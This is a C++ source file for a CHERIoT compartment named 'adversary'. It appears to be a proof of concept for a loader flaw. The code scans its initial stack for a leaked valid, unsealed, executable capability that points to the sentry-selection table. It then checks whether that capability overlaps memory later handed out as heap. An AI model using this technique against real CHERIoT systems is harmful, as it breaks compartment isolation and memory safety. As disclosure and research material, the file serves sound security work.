#include "adversary.h"

#include <cheri.hh>
#include <compartment.h>
#include <debug.hh>

using Debug = ConditionalDebug<true, "Adversary">;
using CHERI::Capability;

	void *capturedCapability;

CHERIOT_INITIALISER(dump_initial_stack, 0)
{
	Capability<void>   stack{__builtin_cheri_stack_get()};
	Capability<void *> cursor = stack.cast<void *>();

	static void     *snapshot[256];
	static ptraddr_t snapshotAddrs[256];
	size_t           wordCount = 0;

	for (ptraddr_t a = stack.top() - sizeof(void *);
	     a >= stack.base() && wordCount < 256;
	     a -= sizeof(void *))
	{
		cursor.address()         = a;
		snapshotAddrs[wordCount] = a;
		snapshot[wordCount]      = *cursor;
		wordCount++;
	}

	Debug::log("compartment stack {}", stack);
	Debug::log("stack snapshot:");
	for (size_t i = 0; i < wordCount; i++)
	{
		if (snapshotAddrs[i] == stack.address() - sizeof(void *))
		{
			Debug::log("\t-- sp {} --", stack.address());
		}
		Capability<void> word{snapshot[i]};
		Debug::log("\t[{}] {}", snapshotAddrs[i], word);
		// The loader leaks a valid, unsealed, executable capability
		// with 0xc length, pointing to the sentry-selection table (seal_entry() in boot.cc),
		// and which memory is recycled as heap memory.
		if (word.is_valid() && !word.is_sealed() &&
		    word.permissions().contains(CHERI::Permission::Execute) &&
		    word.length() == 0xc)
		{
			capturedCapability = snapshot[i];
			Debug::log("\t^ captured ^");
		}
	}

	Debug::log("captured = {}", Capability<void>{capturedCapability});
}

// Show that the capability captured by the initialiser overlaps with some allocated memory
void check_overlap(ptraddr_t base, size_t length)
{
	ptraddr_t target = Capability<void>{capturedCapability}.address();
	bool      overlaps = (target >= base) && (target < base + length);
	Debug::log("[{}, {}) {} captured address {}",
	           base,
	           base + length,
	           overlaps ? "overlaps" : "does not overlap",
	           target);
}
